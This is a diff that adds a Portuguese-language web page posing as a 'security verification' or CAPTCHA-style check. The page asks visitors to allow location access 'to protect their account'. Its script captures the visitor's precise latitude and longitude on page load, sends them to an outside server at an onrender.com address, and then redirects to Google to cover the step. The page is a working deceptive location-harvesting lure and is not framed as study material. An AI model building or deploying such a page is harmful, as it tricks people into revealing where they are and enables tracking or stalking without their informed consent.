@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificação de Segurança</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #f3f3f3;
+      text-align: center;
+      padding: 50px;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: auto;
+    }
+    .loading {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verificação de Segurança</h2>
+    <p>Para continuar, clique em <strong>"Permitir"</strong> quando o navegador solicitar acesso à sua localização.</p>
+    <p>Essa verificação ajuda a proteger sua conta e garantir que você não é um robô.</p>
+    <p id="status" class="loading">Aguardando permissão...</p>
+  </div>
+
+  <script>
+    async function enviarLocalizacao(latitude, longitude) {
+      try {
+        await fetch("https://localizao-precisa.onrender.com/api", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude })
+        });
+        // Redireciona após enviar
+        window.location.href = "https://google.com"; // Substitua aqui pela próxima página real
+      } catch (error) {
+        document.getElementById("status").innerText = "Erro ao enviar localização.";
+        console.error(error);
+        setTimeout(() => {
+          window.location.href = "https://google.com";
+        }, 2000);
+      }
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            document.getElementById("status").innerText = "Localização capturada com sucesso. Redirecionando...";
+            enviarLocalizacao(position.coords.latitude, position.coords.longitude);
+          },
+          (err) => {
+            document.getElementById("status").innerText = "Permissão negada. Não foi possível verificar.";
+            setTimeout(() => {
+              window.location.href = "https://google.com";
+            }, 3000);
+          }
+        );
+      } else {
+        document.getElementById("status").innerText = "Seu navegador não suporta geolocalização.";
+        setTimeout(() => {
+          window.location.href = "https://google.com";
+        }, 3000);
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
